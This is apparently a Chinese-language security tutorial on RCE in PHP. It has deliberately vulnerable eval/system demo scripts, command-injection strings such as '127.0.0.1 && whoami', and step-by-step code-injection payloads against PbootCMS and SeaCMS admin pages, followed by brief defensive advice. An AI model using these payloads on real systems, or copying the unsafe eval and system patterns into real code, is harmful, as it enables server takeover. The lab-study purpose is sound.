==1.RCE 简介与危害==
所谓 RCE 漏洞，即 Remote Code/Command Execution，远程代码执行和远程命令执行漏洞。在很
多 Web 应用中，开发人员会使用一些函数，这些函数以一些字符串作为输入，功能是将输入的字
符串当作代码或者命令来进行执行。当用户可以控制这些函数的输入时，就产生了 RCE 漏洞。RCE
漏洞是非常严重的安全漏洞，一旦出现，就意味着攻击者可以获取服务器的命令执行权限，从而
对服务器安全造成极大的影响。
案例：远程代码执行
http://localhost/rce/rce01.php?x=phpinfo();
http://localhost/rce/rce01.php?x=echo%20abc;
```
<?php

$code=$_GET['x'];

eval($code);

?>
```


案例：远程命令执行
http://localhost/rce/rce02.php?x=whoami
http://localhost/rce/rce02.php?x=ipconfig
```
<?php

$code=$_GET['x'];

echo system($code);

?>
```


2、公开漏洞利用
靶场重现
案例 1：
命令注入执行分析
https://www.mozhe.cn/bug/detail/12
越过前端验证
127.0.0.1 | ls
127.0.0.1 && whoami


```
#包围的内容会当 在 php 中称之为执行运算符，PHP 将尝试将反引号中的内容作为shell 命令来执行，并将其输出信息返回
echo `$_REQUEST[a]`;; ?>
```



CMS 案例
案例 1：PbootCMS
http://localhost/PbootCMS/admin.php
账号：admin 密码：123456
步骤 1：在线留言
`AboutController：{pboot:if(eval($_POST[1]))}!!!{/pboot:if}`
步骤 2：首页注入：
http://localhost/PbootCMS/index.php/about/10.html
#post data：1=phpinfo();

==审计视角==
审计工具查询危险函数
Seay源代码审计系统



案例 2：SeaCms
http://localhost/SeaCMS/3nt7dh/login.php
admin/admin
系统设置-后台IP设置：
```
127.0.0.1";phpinfo();//
<a href='https://www.seacms.net'>链接</a>;phpinfo();//
qqq;phpinfo();//
```




==3.RCE 漏洞防御==
1.在进入执行命令函数前进行严格的检测和过滤;
2.尽量不要使用命令执行函数，不能完全控制的危险函数最好不使用，如果非要用的话可以加验证防止被其他人利用。
3.对于 eval 函数，一定要保证用户不能轻易接触 eval 的参数，如果需要运用到则必须严格判断输入的数据是否含有危险变量;